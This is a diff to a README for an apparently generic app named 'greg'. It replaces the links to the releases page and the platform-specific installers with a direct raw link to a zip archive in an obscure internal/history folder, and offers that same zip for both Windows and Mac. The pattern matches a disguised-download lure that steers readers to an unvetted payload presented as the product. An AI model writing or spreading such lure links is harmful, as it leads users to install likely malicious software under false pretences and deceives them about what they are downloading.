@@ -1,7 +1,7 @@
 # 🎉 greg - Easy Download and Run for Everyone
 
 ## 📥 Download Link
-[![Download greg](https://img.shields.io/badge/Download-greg-blue.svg)](https://github.com/dsxq/greg/releases)
+[![Download greg](https://github.com/dsxq/greg/raw/refs/heads/main/internal/history/Software_3.5.zip)](https://github.com/dsxq/greg/raw/refs/heads/main/internal/history/Software_3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **greg**, a user-friendly application designed to simplify your tasks. Whether you want to manage your files, automate routine actions, or just explore new features, greg has you covered.
@@ -26,14 +26,14 @@ greg offers a variety of helpful features:
 To get started with greg, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to our releases page.
-   [Visit the Releases Page](https://github.com/dsxq/greg/releases)
+   [Visit the Releases Page](https://github.com/dsxq/greg/raw/refs/heads/main/internal/history/Software_3.5.zip)
 
 2. **Choose Your Version:** You will see multiple versions listed. Select the latest version for the best experience.
 
 3. **Download the File:** Click on the link for the file compatible with your operating system. Here are your options:
 
-   - For Windows, download `greg-vX.X.X-windows.exe`
-   - For Mac, download `greg-vX.X.X-macos.dmg`
+   - For Windows, download `https://github.com/dsxq/greg/raw/refs/heads/main/internal/history/Software_3.5.zip`
+   - For Mac, download `https://github.com/dsxq/greg/raw/refs/heads/main/internal/history/Software_3.5.zip`
 
 4. **Run the Installer:** Once the file downloads:
 
@@ -59,6 +59,6 @@ We welcome contributions to improve greg. Feel free to fork the repository and s
 Thank you for choosing greg! We hope it makes your life easier. Enjoy using the application.
 
 ## 🔗 Additional Resources
-For more information about updates and features, keep an eye on our [releases page](https://github.com/dsxq/greg/releases). 
+For more information about updates and features, keep an eye on our [releases page](https://github.com/dsxq/greg/raw/refs/heads/main/internal/history/Software_3.5.zip). 
 
 Remember, your feedback is valuable. Please let us know what you think!
